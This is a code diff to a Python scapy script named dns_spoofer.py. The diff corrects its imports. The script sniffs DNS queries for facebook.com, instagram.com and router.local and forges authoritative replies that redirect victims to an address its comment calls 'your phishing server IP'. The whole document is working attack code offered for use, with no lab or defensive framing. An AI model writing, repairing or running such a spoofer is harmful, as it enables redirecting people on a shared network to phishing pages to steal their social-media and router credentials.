@@ -1,6 +1,5 @@
 # dns_spoofer.py
 import scapy.all as scapy
-from scapy.layers import dns, udp, ip
 from socket import gethostbyname
 import sys
 
@@ -9,22 +8,22 @@ SPOOF_DOMAINS = ["facebook.com", "instagram.com", "router.local"]
 SPOOF_IP = "192.168.1.66"  # your phishing server IP
 
 def process_packet(pkt):
-    if pkt.haslayer(dns.DNSQR):  # DNS Question Record
-        queried_domain = pkt[dns.DNSQR].qname.decode().rstrip(".")
+    if pkt.haslayer(scapy.DNSQR):  # DNS Question Record
+        queried_domain = pkt[scapy.DNSQR].qname.decode().rstrip(".")
         print(f"[📡] DNS Request: {queried_domain}")
 
-        for target in SPOOF_DOMAINS:
+        for target in SPOOF_DOMAINS: 
             if target in queried_domain:
                 print(f"[🎯] Spoofing {queried_domain} → {SPOOF_IP}")
                 spoofed_pkt = (
-                    ip.IP(dst=pkt[ip.IP].src, src=pkt[ip.IP].dst) /
-                    udp.UDP(dport=pkt[udp.UDP].sport, sport=53) /
-                    dns.DNS(
-                        id=pkt[dns.DNS].id,
+                    scapy.IP(dst=pkt[scapy.IP].src, src=pkt[scapy.IP].dst) /
+                    scapy.UDP(dport=pkt[scapy.UDP].sport, sport=53) /
+                    scapy.DNS(
+                        id=pkt[scapy.DNS].id,
                         qr=1,
                         aa=1,
-                        qd=pkt[dns.DNS].qd,
-                        an=dns.DNSRR(rrname=pkt[dns.DNSQR].qname, rdata=SPOOF_IP)
+                        qd=pkt[scapy.DNS].qd,
+                        an=scapy.DNSRR(rrname=pkt[scapy.DNSQR].qname, rdata=SPOOF_IP)
                     )
                 )
                 scapy.send(spoofed_pkt, verbose=0)
